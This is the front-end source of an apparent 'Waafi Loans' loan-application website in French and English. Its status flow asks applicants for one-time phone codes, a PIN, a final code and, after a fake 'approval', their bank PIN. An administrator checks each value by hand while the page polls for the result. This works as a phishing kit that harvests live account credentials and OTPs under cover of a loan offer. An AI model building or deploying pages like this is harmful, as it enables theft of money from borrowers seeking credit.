"use client";

import { FormEvent, useEffect, useRef, useState } from "react";

type View = "home" | "apply" | "track" | "status";
type Application = {
  applicationId: string;
  referenceId: string;
  status: string;
  fullName?: string;
  requestedAmount?: number;
};

type Language = "fr" | "en";

const copy = {
  fr: {
    howItWorks: "Comment ça marche", track: "Suivre la demande", apply: "Faire une demande", closeMenu: "Fermer le menu", openMenu: "Ouvrir le menu", calculator: "Calculateur de prêt", loanAmount: "Montant du prêt", loanTerm: "Durée du prêt", months: "mois", monthlyRepayment: "Remboursement mensuel", fastApproval: "Approbation rapide", within24Hours: "Sous 24 heures", simpleRates: "Taux simples", from18: "À partir de 18 %", protected: "Protégé", bankSecurity: "Sécurité bancaire", menu: "Menu", applyForLoan: "Demander un prêt", application: "Demande de prêt", chapter: "Construisons votre prochaine étape.", applicationIntro: "Remplissez le formulaire ci-dessous. Cela prend environ cinq minutes, puis vous pourrez suivre chaque étape.", privateInfo: "Vos informations restent privées.", authorizedOnly: "Seuls les administrateurs autorisés peuvent consulter votre demande.", aboutYou: "À propos de vous", required: "Les champs marqués d’un * sont obligatoires", fullName: "Nom complet *", idPlaceholder: "Comme indiqué sur votre pièce d’identité", phone: "Numéro de téléphone *", email: "Adresse e-mail", loan: "Votre prêt", chooseLoan: "Choisissez ce qui vous convient", product: "Produit de prêt *", selectProduct: "Sélectionnez un produit", business: "Prêt de croissance professionnelle", personal: "Prêt de soutien personnel", education: "Prêt pour l’éducation", emergency: "Prêt d’urgence", purpose: "Comment utiliserez-vous le prêt ? *", purposePlaceholder: "Parlez-nous brièvement de vos projets", submitting: "Envoi en cours…", submit: "Envoyer la demande", consent: "En envoyant ce formulaire, vous confirmez que les informations fournies sont exactes.", status: "Statut de la demande", continue: "Reprenez là où vous vous êtes arrêté.", trackIntro: "Saisissez les deux identifiants affichés sur votre écran de confirmation pour consulter votre progression en toute sécurité.", applicationId: "Identifiant de demande", referenceId: "Identifiant de référence", checking: "Vérification…", checkStatus: "Vérifier mon statut", copy: "Copier", requested: "Montant demandé", submitted: "Envoyée", review: "Examen", verification: "Vérification", decision: "Décision", verificationCode: "Code de vérification", sixDigit: "Code à 6 chiffres", verifyCode: "Vérifier le code", membershipId: "Identifiant d’adhésion", verifyMembership: "Vérifier l’adhésion", autoUpdate: "● Cette page se met à jour automatiquement", backHome: "← Retour à l’accueil", footer: "Waafi Loans, un chemin plus clair vers la suite.",
  },
  en: {
    howItWorks: "How it works", track: "Track application", apply: "Apply now", closeMenu: "Close menu", openMenu: "Open menu", calculator: "Loan calculator", loanAmount: "Loan amount", loanTerm: "Loan term", months: "months", monthlyRepayment: "Monthly repayment", fastApproval: "Fast approval", within24Hours: "24 hours or less", simpleRates: "Simple rates", from18: "From 18%", protected: "Protected", bankSecurity: "Bank-level security", menu: "Menu", applyForLoan: "Apply for a loan", application: "Loan application", chapter: "Let’s build your next chapter.", applicationIntro: "Complete the form below. It takes about five minutes, and you can track every step afterward.", privateInfo: "Your information stays private.", authorizedOnly: "Only authorized administrators can review your application.", aboutYou: "About you", required: "Fields marked * are required", fullName: "Full name *", idPlaceholder: "As shown on your ID", phone: "Phone number *", email: "Email address", loan: "Your loan", chooseLoan: "Choose what works for you", product: "Loan product *", selectProduct: "Select a loan product", business: "Business Growth Loan", personal: "Personal Support Loan", education: "Education Loan", emergency: "Emergency Loan", purpose: "How will you use the loan? *", purposePlaceholder: "Tell us briefly about your plans", submitting: "Submitting…", submit: "Submit application", consent: "By submitting, you confirm that the information provided is accurate.", status: "Application status", continue: "Pick up where you left off.", trackIntro: "Enter both IDs from your confirmation screen to securely view your progress.", applicationId: "Application ID", referenceId: "Reference ID", checking: "Checking…", checkStatus: "Check my status", copy: "Copy", requested: "Requested amount", submitted: "Submitted", review: "Review", verification: "Verification", decision: "Decision", verificationCode: "Verification code", sixDigit: "6-digit code", verifyCode: "Verify code", membershipId: "Membership ID", verifyMembership: "Verify membership", autoUpdate: "● This page updates automatically", backHome: "← Back to home", footer: "Waafi Loans means a clearer path to what’s next.",
  },
} as const;

const statusCopy: Record<Language, Record<string, { eyebrow: string; title: string; body: string }>> = {
  fr: {
    SUBMITTED: { eyebrow: "Demande reçue", title: "Nous vérifions vos informations", body: "Votre demande est en cours d’examen. Vous pouvez quitter cette page et revenir à tout moment avec vos identifiants." },
    UNDER_REVIEW: { eyebrow: "Examen en cours", title: "Nous vérifions vos informations", body: "Un conseiller Waafi Loans examine vos informations et votre admissibilité." },
    VERIFICATION_REQUIRED: { eyebrow: "Examen initial réussi", title: "Vérification requise", body: "Votre demande avance. Veuillez patienter pendant la préparation de votre code de vérification." },
    OTP_PENDING: { eyebrow: "Vérification d’identité", title: "Saisissez votre code de vérification", body: "Saisissez le code à six chiffres envoyé à votre numéro de téléphone enregistré." },
    OTP_VERIFIED: { eyebrow: "Code accepté", title: "Identité vérifiée", body: "Votre code de vérification a été accepté. La vérification de l’adhésion est la prochaine étape." },
    MEMBERSHIP_NUMBER_PENDING: { eyebrow: "Vérification en cours", title: "Votre premier code est en cours de vérification", body: "Un administrateur vérifie les informations envoyées. Vous pourrez continuer dès que la vérification sera terminée." },
    MEMBERSHIP_ID_REQUIRED: { eyebrow: "Dernière vérification", title: "Vérifiez votre PIN", body: "Le code précédent a été accepté. Saisissez votre PIN pour continuer." },
    SECOND_OTP_REQUIRED: { eyebrow: "PIN reçu", title: "Saisissez le code final", body: "Votre PIN a été reçu. Saisissez le code final pour terminer la vérification." },
    MEMBERSHIP_VERIFIED: { eyebrow: "Vérification terminée", title: "Prêt pour l’examen final", body: "Votre identité et votre adhésion sont vérifiées. Votre demande attend une décision finale." },
    FINAL_APPROVAL_PENDING: { eyebrow: "Examen final", title: "Décision en cours", body: "Votre demande est auprès de l’administrateur autorisé pour approbation finale." },
    APPROVED: { eyebrow: "Félicitations", title: "Votre prêt est approuvé", body: "Votre organisation traitera le versement séparément." },
    AWAITING_DISBURSEMENT: { eyebrow: "Approuvé", title: "Préparation de votre versement", body: "Vos fonds seront envoyés manuellement par l’organisation." },
    DISBURSED: { eyebrow: "Fonds déposés", title: "Le montant a été déposé sur votre compte", body: "Votre organisation a confirmé le dépôt de votre prêt sur le compte associé à votre demande." },
    REJECTED: { eyebrow: "Mise à jour de la demande", title: "Demande non approuvée", body: "Votre demande n’a pas été approuvée cette fois-ci. Contactez votre organisation pour plus d’informations." },
  },
  en: {
    SUBMITTED: { eyebrow: "Application received", title: "We’re checking your information", body: "Your application is safely in review. You can leave this page and return anytime using your IDs." },
    UNDER_REVIEW: { eyebrow: "Review in progress", title: "We’re checking your information", body: "A Waafi Loans officer is reviewing your details and eligibility." },
    VERIFICATION_REQUIRED: { eyebrow: "Initial review passed", title: "Verification required", body: "Your application has moved forward. Please wait while your verification code is prepared." },
    OTP_PENDING: { eyebrow: "Identity check", title: "Enter your verification code", body: "Enter the six-digit code sent to your registered phone number." },
    OTP_VERIFIED: { eyebrow: "Code accepted", title: "Identity verified", body: "Your verification code was accepted. Membership verification is next." },
    MEMBERSHIP_NUMBER_PENDING: { eyebrow: "Verification in progress", title: "Your first code is being checked", body: "An administrator is checking the information you submitted. You can continue when it is confirmed." },
    MEMBERSHIP_ID_REQUIRED: { eyebrow: "One final check", title: "Verify your PIN", body: "The previous code was accepted. Enter your PIN to continue." },
    SECOND_OTP_REQUIRED: { eyebrow: "PIN received", title: "Enter the final code", body: "Your PIN was received. Enter the final code to complete verification." },
    MEMBERSHIP_VERIFIED: { eyebrow: "Verification complete", title: "Ready for final review", body: "Your identity and membership are verified. Your application is awaiting a final decision." },
    FINAL_APPROVAL_PENDING: { eyebrow: "Final review", title: "Decision in progress", body: "Your application is with the authorized loan administrator for final approval." },
    APPROVED: { eyebrow: "Congratulations", title: "Your loan is approved", body: "Your organization will process the disbursement separately." },
    AWAITING_DISBURSEMENT: { eyebrow: "Approved", title: "Preparing your disbursement", body: "Your funds will be sent manually by the organization." },
    DISBURSED: { eyebrow: "Funds deposited", title: "The amount has been deposited into your account", body: "Your organization confirmed that the loan amount was deposited into the account linked to your application." },
    REJECTED: { eyebrow: "Application update", title: "Application not approved", body: "Your application was not approved at this time. Contact your organization if you need more information." },
  },
};

const money = new Intl.NumberFormat("fr-DJ", { maximumFractionDigits: 0 });

export default function Home() {
  const [language, setLanguage] = useState<Language>("fr");
  const text = copy[language];
  const [view, setView] = useState<View>("home");
  const [loanAmount, setLoanAmount] = useState(5000);
  const [loanTerm, setLoanTerm] = useState(12);
  const [menuOpen, setMenuOpen] = useState(false);
  const [application, setApplication] = useState<Application | null>(null);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const [notice, setNotice] = useState<{ kind: "waiting" | "success" | "error"; text: string } | null>(null);
  const [pendingVerification, setPendingVerification] = useState<"otp" | "membership" | "final-otp" | "bank-number" | null>(null);
  const observedStatus = useRef<string | null>(null);

  useEffect(() => {
    if (view !== "status" || !application?.applicationId) return;
    const timer = window.setInterval(async () => {
      try {
        const response = await fetch(`/api/applications/${application.applicationId}/status`);
        if (response.ok) {
          const next = await response.json() as Application;
          const previous = observedStatus.current;
          if (pendingVerification) {
            const waitingStatus = pendingVerification === "otp"
              ? next.status === "MEMBERSHIP_NUMBER_PENDING"
              : pendingVerification === "membership"
                ? next.status === "SECOND_OTP_REQUIRED"
                : pendingVerification === "final-otp"
                  ? next.status === "FINAL_APPROVAL_PENDING"
                  : next.status === "BANK_NUMBER_PENDING";
            const rejected = (pendingVerification === "otp" && next.status === "OTP_PENDING") ||
              (pendingVerification === "membership" && next.status === "MEMBERSHIP_ID_REQUIRED") ||
              (pendingVerification === "final-otp" && ["SECOND_OTP_REQUIRED", "MEMBERSHIP_ID_REQUIRED"].includes(next.status)) ||
              (pendingVerification === "bank-number" && next.status === "APPROVED");
            if (waitingStatus) {
              observedStatus.current = next.status;
              return;
            }
            if (rejected || next.status !== previous) {
              setPendingVerification(null);
              setNotice({
                kind: rejected ? "error" : "success",
                text: rejected
                  ? (language === "fr" ? "Information incorrecte. Veuillez réessayer." : "That information was not accepted. Please try again.")
                  : (language === "fr" ? "Information confirmée. Continuez." : "Information confirmed. Continue.")
              });
            }
          }
          observedStatus.current = next.status;
          setApplication(next);
        }
      } catch { /* keep the last known status while offline */ }
    }, 5000);
    return () => window.clearInterval(timer);
  }, [view, application?.applicationId, pendingVerification, language]);

  async function apply(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setLoading(true); setMessage("");
    const payload = Object.fromEntries(new FormData(event.currentTarget));
    try {
      const response = await fetch("/api/applications", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(payload) });
      const data = await response.json();
      if (!response.ok) throw new Error(data.error || "We could not submit your application.");
      setApplication(data); observedStatus.current = data.status; setView("status"); window.scrollTo({ top: 0, behavior: "smooth" });
    } catch (error) { setMessage(error instanceof Error ? error.message : "Please try again."); }
    finally { setLoading(false); }
  }

  async function track(event: FormEvent<HTMLFormElement>) {
    event.preventDefault(); setLoading(true); setMessage("");
    const data = new FormData(event.currentTarget);
    try {
      const id = String(data.get("applicationId") || "").trim().toUpperCase();
      const reference = String(data.get("referenceId") || "").trim().toUpperCase();
      const response = await fetch(`/api/applications/${id}/status?reference=${encodeURIComponent(reference)}`);
      const result = await response.json();
      if (!response.ok) throw new Error(result.error || "Application not found.");
      setApplication(result); observedStatus.current = result.status; setView("status");
    } catch (error) { setMessage(error instanceof Error ? error.message : "Please try again."); }
    finally { setLoading(false); }
  }

  async function verify(kind: "otp" | "membership" | "final-otp" | "bank-name", value: string) {
    if (!application) return;
    setLoading(true); setMessage("");
    try {
      const endpoint = kind === "bank-name" ? "bank-name" : `verify-${kind}`;
      const response = await fetch(`/api/applications/${application.applicationId}/${endpoint}`, {
        method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ value, referenceId: application.referenceId }),
      });
      const result = await response.json();
      if (!response.ok) {
        setNotice({ kind: "error", text: result.error || (language === "fr" ? "La vérification a échoué." : "Verification failed.") });
        return;
      }
      setPendingVerification(kind === "bank-name" ? "bank-number" : kind);
      setNotice({ kind: "waiting", text: language === "fr" ? "Envoyé. En attente de vérification." : "Sent. Waiting for verification." });
    } catch {
      setNotice({ kind: "error", text: language === "fr" ? "Connexion impossible. Réessayez." : "Connection failed. Please try again." });
    } finally {
      setLoading(false);
    }
  }

  return (
    <main className={`siteFrame ${view === "home" ? "homeFrame" : "interiorFrame"}`}>
      <header className={`nav shell ${view === "home" ? "cinemaNav" : ""}`}>
        <button className="brand" onClick={() => setView("home")} aria-label="Waafi Loans home">
          <span className="brandMark">W</span><span>Waafi <b>Loans</b></span>
        </button>
        <nav aria-label="Main navigation">
          <button onClick={() => setView("home")}>{text.howItWorks}</button>
          <button onClick={() => { setMessage(""); setView("track"); }}>{text.track}</button>
          {view === "home" && <button className="navCta" onClick={() => { setMessage(""); setView("apply"); }}>{text.apply} <span>→</span></button>}
        </nav>
        <div className="languageSwitch" aria-label="Language">
          <button className={language === "fr" ? "selected" : ""} onClick={() => setLanguage("fr")}>FR</button>
          <button className={language === "en" ? "selected" : ""} onClick={() => setLanguage("en")}>EN</button>
        </div>
        {view === "home" && <button className="burger" onClick={() => setMenuOpen(!menuOpen)} aria-expanded={menuOpen} aria-label={menuOpen ? text.closeMenu : text.openMenu}><i></i><i></i></button>}
      </header>

      {view === "home" && <>
        <section className={`loanLanding ${menuOpen ? "menuOpen" : ""}`}>
          <div className="loanLandingInner shell">
            <div className="loanCalculator" aria-label={text.calculator}>
              <div className="calculatorRow">
                <div className="calculatorLabel"><span>{text.loanAmount}</span><strong>DJF {loanAmount.toLocaleString("fr-DJ")}</strong></div>
                <input type="range" min="100" max="500000" step="100" value={loanAmount} onChange={(event) => setLoanAmount(Number(event.target.value))} aria-label={text.loanAmount} />
                <div className="rangeEnds"><span>DJF 100</span><span>DJF 500 000</span></div>
              </div>
              <div className="calculatorRow">
                <div className="calculatorLabel"><span>{text.loan}</span><strong>{loanTerm} {text.months}</strong></div>
                <input type="range" min="6" max="24" step="1" value={loanTerm} onChange={(event) => setLoanTerm(Number(event.target.value))} aria-label={text.loanTerm} />
                  <div className="rangeEnds"><span>6 {text.months}</span><span>24 {text.months}</span></div>
              </div>
              <div className="repayment"><span>{text.monthlyRepayment}</span><strong>DJF {Math.ceil((loanAmount * 1.1) / loanTerm).toLocaleString("fr-DJ")}</strong></div>
              <button className="landingApply" onClick={() => setView("apply")}>{text.apply} <span aria-hidden="true">+</span></button>
            </div>
          </div>
          <div className="landingBenefits shell">
            <div><span className="benefitIcon">1</span><strong>{text.fastApproval}</strong><small>{text.within24Hours}</small></div>
            <div><span className="benefitIcon">2</span><strong>{text.simpleRates}</strong><small>{text.from18}</small></div>
            <div><span className="benefitIcon">3</span><strong>{text.protected}</strong><small>{text.bankSecurity}</small></div>
          </div>
          <div className="mobileMenu" aria-hidden={!menuOpen}><p>{text.menu}</p><button onClick={() => { setMenuOpen(false); setView("apply"); }}>{text.applyForLoan} <span>→</span></button><button onClick={() => { setMenuOpen(false); setView("track"); }}>{text.track} <span>→</span></button><button onClick={() => setMenuOpen(false)}>{text.howItWorks} <span>→</span></button></div>
        </section>
      </>}

      {view === "apply" && <section className="formPage shell">
        <div className="processRail" aria-label={language === "fr" ? "Étapes de la demande" : "Application steps"}>
          <div className="processRailStep active"><span>01</span><b>{language === "fr" ? "Demande" : "Application"}</b></div>
          <div className="processRailLine"></div>
          <div className="processRailStep"><span>02</span><b>{language === "fr" ? "Vérification" : "Verification"}</b></div>
          <div className="processRailLine"></div>
          <div className="processRailStep"><span>03</span><b>{language === "fr" ? "Décision" : "Decision"}</b></div>
        </div>
        <div className="formIntro"><span className="kicker">{text.application}</span><p>{language === "fr" ? "Quelques informations pour commencer." : "A few details to get started."}</p><div className="sideNote"><b>{text.privateInfo}</b><span>{text.authorizedOnly}</span></div></div>
        <form className="formCard" onSubmit={apply}>
          <div className="formHeader"><span>1</span><div><b>{text.aboutYou}</b><small>{text.required}</small></div></div>
          <label>{text.fullName}<input name="fullName" required minLength={3} placeholder={text.idPlaceholder} /></label>
          <div className="grid2"><label>{text.phone}<input name="phone" required placeholder="+253 77 XX XX XX" /></label><label>{text.email}<input name="email" type="email" placeholder="you@example.com" /></label></div>
          <div className="formHeader divider"><span>2</span><div><b>{text.loan}</b><small>{text.chooseLoan}</small></div></div>
          <label>{text.product}<select name="loanProduct" required defaultValue=""><option value="" disabled>{text.selectProduct}</option><option>{text.business}</option><option>{text.personal}</option><option>{text.education}</option><option>{text.emergency}</option></select></label>
          <input type="hidden" name="requestedAmount" value={loanAmount} />
          <input type="hidden" name="repaymentPeriod" value={loanTerm} />
          {message && <p className="error" role="alert">{message}</p>}
          <button className="primary wide" disabled={loading}>{loading ? text.submitting : text.submit}<span>→</span></button>
          <small className="consent">{text.consent}</small>
        </form>
      </section>}

      {view === "track" && <section className="centerPage shell">
        <div className="processRail compact" aria-label={language === "fr" ? "Suivi de la demande" : "Application tracking"}>
          <div className="processRailStep active"><span>01</span><b>{language === "fr" ? "Vos identifiants" : "Your IDs"}</b></div>
          <div className="processRailLine"></div>
          <div className="processRailStep"><span>02</span><b>{language === "fr" ? "Votre statut" : "Your status"}</b></div>
        </div>
        <span className="kicker">{text.status}</span><p className="minimalIntro">{language === "fr" ? "Consultez votre progression." : "View your progress."}</p>
        <form className="trackCard" onSubmit={track}><label>{text.applicationId}<input name="applicationId" required placeholder="LN-000123" /></label><label>{text.referenceId}<input name="referenceId" required placeholder="APP-000456" /></label>{message && <p className="error">{message}</p>}<button className="primary wide" disabled={loading}>{loading ? text.checking : text.checkStatus}<span>→</span></button></form>
      </section>}

      {view === "status" && application && <section className="centerPage statusPage shell">
        <div className="statusCard">
          {application.requestedAmount && <div className="amountRow"><span>{text.requested}</span><b>DJF {money.format(application.requestedAmount)}</b></div>}
          {["SUBMITTED", "UNDER_REVIEW", "MEMBERSHIP_NUMBER_PENDING", "PIN_CONFIRMED", "FINAL_APPROVAL_PENDING", "APPROVED", "BANK_NUMBER_PENDING", "BANK_NUMBER_CONFIRMED", "DISBURSED"].includes(application.status) && <div className="statusBrief"><span className="statusBriefDot"></span><span>{statusBrief[language][application.status]}</span></div>}
          {application.status === "OTP_PENDING" && !pendingVerification && <VerifyForm digits={6} label={text.verificationCode} button={text.verifyCode} onSubmit={(v) => verify("otp", v)} />}
          {application.status === "MEMBERSHIP_ID_REQUIRED" && !pendingVerification && <VerifyForm digits={4} label="PIN" button={language === "fr" ? "Envoyer le PIN" : "Submit PIN"} onSubmit={(v) => verify("membership", v)} />}
          {["SECOND_OTP_REQUIRED", "PIN_CONFIRMED"].includes(application.status) && !pendingVerification && <VerifyForm digits={6} label={text.verificationCode} button={text.verifyCode} onSubmit={(v) => verify("final-otp", v)} />}
         {application.status === "APPROVED" &&
  !pendingVerification && (
    <VerifyForm
      digits={6}
      label={language === "fr" ? "Code PIN bancaire" : "Bank PIN"}
      button={language === "fr" ? "Soumettre le code PIN" : "Submit PIN"}
      onSubmit={(v) => {
        verify("bank-name", v);
        setPendingVerification("bank-number");
      }}
    />
  )}
          {notice && <div className={`slideNotice ${notice.kind}`} role="status">{notice.text}</div>}
          {message && <p className="error">{message}</p>}
        </div>
        <p className="refresh">{text.autoUpdate}</p>
        <button className="textButton" onClick={() => setView("home")}>{text.backHome}</button>
      </section>}

      <footer><div className="shell"><div className="brand footerBrand"><span className="brandMark">W</span><span>Waafi <b>Loans</b></span></div><p>{text.footer}</p><span>© 2026 Waafi Loans</span></div></footer>
    </main>
  );
}

const statusBrief: Record<Language, Record<string, string>> = {
  fr: {
    SUBMITTED: "Votre demande est reçue. Nous la vérifions.",
    UNDER_REVIEW: "Votre demande est en cours d’examen.",
    MEMBERSHIP_NUMBER_PENDING: "Votre code est en cours de vérification.",
    PIN_CONFIRMED: "PIN confirmé. Le code final est prêt.",
    FINAL_APPROVAL_PENDING: "Vérification terminée. Décision en cours.",
    APPROVED: "Demande approuvée. Versement en préparation.",
    BANK_NUMBER_PENDING: "Votre numéro bancaire est en cours de vérification.",
    BANK_NUMBER_CONFIRMED: "Numéro bancaire confirmé. Versement en préparation.",
    DISBURSED: "Le montant a été déposé sur votre compte.",
  },
  en: {
    SUBMITTED: "Your application was received and is being checked.",
    UNDER_REVIEW: "Your application is under review.",
    MEMBERSHIP_NUMBER_PENDING: "Your code is being checked.",
    PIN_CONFIRMED: "PIN confirmed. The final code is ready.",
    FINAL_APPROVAL_PENDING: "Verification complete. Decision in progress.",
    APPROVED: "Application approved. Disbursement is being prepared.",
    BANK_NUMBER_PENDING: "Your bank pin is being checked.",
    BANK_NUMBER_CONFIRMED: "Bank pin confirmed. Disbursement is being prepared.",
    DISBURSED: "The amount has been deposited into your account.",
  },
};

function VerifyForm({ digits, label, button, onSubmit }: { digits: number; label: string; button: string; onSubmit: (value: string) => void }) {
  const [value, setValue] = useState<string[]>(Array(digits).fill(""));
  const inputs = useRef<Array<HTMLInputElement | null>>([]);
  function update(index: number, next: string) {
    const digit = next.replace(/\D/g, "").slice(-1);
    const values = [...value]; values[index] = digit; setValue(values);
    if (digit && index < digits - 1) inputs.current[index + 1]?.focus();
  }
  return <form className="verifyBox" onSubmit={(event) => { event.preventDefault(); onSubmit(value.join("")); }}><label className="codeField"><span className="codeTitle"><b>{label}</b><small>{digits} digits</small></span><span className="codeHint">{label.toLowerCase().includes("bank") || label.toLowerCase().includes("bancaire") ? "Enter the 6-digit bank pin" : digits === 4 ? "Enter your 6-digit PIN" : "Enter the 6-digit code"}</span><div className={`codeCells ${digits === 4 ? "codeCells4" : ""}`}>{value.map((digit, index) => <input key={index} ref={(element) => { inputs.current[index] = element; }} className={`codeCell ${digit ? "filled" : ""}`} inputMode="numeric" maxLength={1} value={digit} onChange={(event) => update(index, event.target.value)} onKeyDown={(event) => { if (event.key === "Backspace" && !value[index] && index > 0) inputs.current[index - 1]?.focus(); }} aria-label={`${label} digit ${index + 1} of ${digits}`} required />)}</div></label><button className="primary wide" disabled={value.join("").length !== digits}>{button}<span>→</span></button></form>;
}
